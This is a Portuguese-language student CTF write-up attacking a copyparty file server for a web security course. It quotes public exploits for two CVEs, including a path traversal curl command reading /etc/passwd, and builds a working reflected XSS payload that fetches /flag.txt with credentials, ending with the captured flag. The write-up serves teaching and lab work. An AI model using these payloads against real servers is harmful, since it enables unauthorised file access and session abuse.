# CTF - Semana 7

**Objetivo**  
Explorar injeção de código e o contexto de execução de páginas em segurança web utilizando cross-site scripting (XSS).

## 1. Exploração da Vulnerabilidade

### Ambiente

Este desafio consiste em atacar uma página web. O primeiro passo em desafios web é sempre navegar pela página como um utilizador normal e estudar os pedidos HTTP feitos pela página. Para isso, podes usar as Developer Tools do teu browser ou outras extensões dedicadas.

### Contexto

Encontra-se um servidor web de file sharing no endereço [http://ctf-fsi.fe.up.pt:5007](http://ctf-fsi.fe.up.pt:5007).

Queres encontrar a flag, que se encontra num local óbvio do servidor, mas não pode ser acedida diretamente. A maior dica para resolver este desafio é o que fizeste no guião SEED Labs sobre XSS. A construção deste desafio é simplificada, no sentido em que é suposto fazeres o ataque à própria página a correr no teu browser. Num cenário mais real, utilizarias a mesma técnica para correr código, por exemplo, no contexto de outro utilizador e ler ficheiros confidenciais aos quais não deverias ter acesso.

### Tarefas

1. **Encontra o ficheiro referente à flag no servidor. Porque é que não consegues aceder diretamente à flag secreta?**

2. **Este serviço é popular, até pode ser que tenha vulnerabilidades conhecidas. Será que podem ajudar a que acedas à flag?**

3. **Qual é o tipo da vulnerabilidade de XSS (Reflected, Stored ou DOM) que te permitiu aceder à flag?**

>**AVISO: O exploit esperado não funciona no Firefox. Usem sffv outro browser como Chrome, Safari ou Edge.**

---

## 2. Exploração da Vulnerabilidade no Servidor

1. Tarefa 1
    O Ficheiro referente à flag é flag.txt. Não conseguimos aceder diretamente à flag secreta porque o servidor não nos permite aceder diretamente.
    Sendo o conteodo do ficheiro flag.txt.

    ```html
    Nice try, I am only accessible via JavaScript shenanigans.
    ```

    O serviço usado chama se `copyparty`.

2. Tarefa 2
   Foram encontrasos 2 CVE sobre o copyparty, CVE-2023-38501 and CVE-2023-37474

   - CVE-2023-38501
  
    ```bash
    # Exploit Title: copyparty v1.8.6 - Reflected Cross Site Scripting (XSS)
    # Date: 23/07/2023
    # Exploit Author: Vartamtezidis Theodoros (@TheHackyDog)
    # Vendor Homepage: https://github.com/9001/copyparty/
    # Software Link: https://github.com/9001/copyparty/releases/tag/v1.8.6
    # Version: <=1.8.6
    # Tested on: Debian Linux
    # CVE : CVE-2023-38501

    #Description
    Copyparty is a portable file server. Versions prior to 1.8.6 are subject to a reflected cross-site scripting (XSS) Attack. 

    Vulnerability that exists in the web interface of the application could allow an attacker to execute malicious javascript code by tricking users into accessing a malicious link.

    #POC
    https://localhost:3923/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
    ```

    Este CVE Consiste em um ataque de XSS Refletido, onde o atacante consegue injetar código malicioso no servidor e executar scripts maliciosos.

    - CVE-2023-37474

    ```bash
    # Exploit Title: copyparty 1.8.2 - Directory Traversal
    # Date: 14/07/2023
    # Exploit Author: Vartamtzidis Theodoros (@TheHackyDog)
    # Vendor Homepage: https://github.com/9001/copyparty/
    # Software Link: https://github.com/9001/copyparty/releases/tag/v1.8.2
    # Version: <=1.8.2
    # Tested on: Debian Linux
    # CVE : CVE-2023-37474

    #Description
    Copyparty is a portable file server. Versions prior to 1.8.2 are subject to a path traversal vulnerability detected in the `.cpr` subfolder. The Path Traversal attack technique allows an attacker access to files, directories, and commands that reside outside the web document root directory.

    #POC
    curl -i -s -k -X  GET 'http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd'
    ```

    Este CVE Consiste em um ataque de Directory Traversal, onde o atacante consegue acessar arquivos fora do diretório raiz do servidor.

3. Tarefa 3

    A vulnerabilidade de XSS que permitiu aceder à flag é Reflected XSS.

    Com este CVE podemos injetar código malicioso no servidor apartir do componente onerror do elemento `<img>` do HTML.

    No Url do servidor, quando tentamos criar uma img esta da erro o que faz com que ele corra o script malicioso.

    O payload usado foi:

    ```html
    k204=y

    <img src="x" onerror="fetch('/flag.txt',{credentials:'include'}).then(response=>response.text()).then(data=>alert(data)).catch(err=>console.error(err))">
    ```

    Neste payload e usado o comando fetch para fazer um pedido ao servidor para obter o conteúdo do ficheiro flag.txt sendo o primeiro argumento o URL do ficheiro e o segundo argumento as credenciais do pedido para garantir que as cookies e a autenticaçao HTTP são enviadas.

    De seguida e passada a resposta para um alerta que mostra o conteúdo do ficheiro. Se ocorrer algum erro, este é mostrado no console.

    O payload injeta um script malicioso que faz um fetch do ficheiro flag.txt e mostra o conteúdo do ficheiro.

    Assim o URL final é: <https://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3Cimg%20src=%22x%22%20onerror=%22fetch(%27/flag.txt%27,{credentials:%27include%27}).then(response=%3Eresponse.text()).then(data=%3Ealert(data)).catch(err=%3Econsole.error(err))%22%3E>

    Usando esse URL obtemos a flag que aparece no alerta.

## Flag

`flag{youGotMeReallyGood}`
